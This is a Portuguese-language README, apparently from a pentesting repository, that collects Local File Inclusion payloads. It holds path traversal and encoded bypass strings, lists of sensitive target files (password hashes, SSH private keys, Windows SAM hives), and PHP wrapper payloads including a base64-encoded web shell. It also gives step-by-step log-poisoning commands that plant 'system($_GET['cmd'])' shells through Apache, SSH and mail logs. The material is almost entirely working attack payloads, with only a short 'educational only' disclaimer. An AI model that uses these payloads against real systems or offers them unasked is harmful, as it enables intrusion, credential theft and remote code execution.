# 📂 Coleção de payloads de LFI

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](LFI.tr.md) • [🇬🇷 Ελληνικά](LFI.el.md)

```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

> **Notas de precisão:** LFI é inclusão de ficheiros locais; path traversal é travessia de diretórios. Ler um ficheiro e incluí-lo como código são operações diferentes. A passagem para RCE depende de conteúdo controlável e interpretação pela aplicação. Os [wrappers PHP](https://www.php.net/manual/en/wrappers.php) exigem suporte, extensões e configuração adequados; `expect://` não está disponível numa instalação PHP comum sem a extensão correspondente. Payloads com byte nulo e caminhos como `boot.ini`/`repair` são exemplos históricos. O acesso a `phar://` não implica automaticamente desserialização de metadados em PHP 8 ([migração PHP 8](https://www.php.net/manual/en/migration80.incompatible.php)). Os caminhos e payloads originais foram mantidos.

---

<a id="-linux-files"></a>
## 🐧 Ficheiros Linux

### Travessia básica de diretórios
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### Codificado como URL
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Técnicas de contorno de proteções
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

### Ficheiros Linux relevantes
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

<a id="-windows-files"></a>
## 🪟 Ficheiros Windows

### Travessia básica de diretórios
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

### Ficheiros Windows relevantes
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

<a id="-wrappers-php"></a>
## 🔄 Wrappers (PHP)

### php://filter (ler o código-fonte)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

### php://input (RCE)
```
php://input
POST: <?php system('id'); ?>
```

### Wrapper data://
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

### expect:// (RCE)
```
expect://id
expect://whoami
```

### Wrapper zip://
```
zip://path/to/file.zip%23shell.php
```

### Wrapper phar://
```
phar://uploads/shell.jpg/test.php
```

---

<a id="-log-poisoning-rce"></a>
## 🔥 Envenenamento de registos (RCE)

### Registo de acessos do Apache
```bash
# 1. Injetar PHP através de User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Incluir o ficheiro de registo
?page=/var/log/apache2/access.log&cmd=id
```

### Registo SSH
```bash
# 1. Injetar através de SSH
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. Incluir o registo
?page=/var/log/auth.log&cmd=id
```

### Registo de email
```bash
# 1. Enviar um email com conteúdo injetado
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. Incluir o registo
?page=/var/log/mail.log&cmd=id
```

### Ambiente do processo em /proc
```
?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Deteção
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

### Contorno de filtros
| Filtro | Contorno |
|--------|--------|
| `../` bloqueado | `....//`, `..././` |
| `.php` obrigatório | `%00`, byte nulo |
| Lista de permissões | Wrappers php:// |

### Parâmetros comuns
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

<a id="-resources"></a>
## 📚 Recursos

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 Arsenal de payloads de LFI</b><br>
  <i>Apenas para fins educativos!</i>
</p>
